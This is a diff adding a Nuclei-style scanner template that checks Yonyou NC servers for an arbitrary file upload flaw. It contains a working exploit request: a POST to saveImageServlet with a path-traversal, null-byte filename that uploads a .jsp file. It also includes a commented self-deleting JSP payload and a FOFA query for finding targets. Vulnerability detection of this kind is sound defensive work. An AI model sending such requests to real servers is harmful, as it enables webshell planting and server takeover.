@@ -1,0 +1,49 @@
+id: 2024-105100046
+
+info:
+  name: 用友NC_saveImageServlet接口存在文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    NC系统的saveImageServlet接口中的filename参数缺乏校验导致任意文件上传，可能造成服务器被后门控制。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC_saveImageServlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  remediation: |
+    补官方补丁，重启修复
+  classification:
+    cve-id: 2024-105100046
+    cvss-score: 9.0
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-04-10
+    version: 用友NC65
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,rce,nc,fileupload,nc65
+
+variables:
+  # pay: <% out.println("file not found");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "file error"
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../{{file_name}}%00 HTTP/1.1
+        Host: 
+        Content-Type: application/octet-stream
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Length: 19
+
+        file error
+
+      - |
+        GET /portal/processxml/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "file error")'
+        condition: and
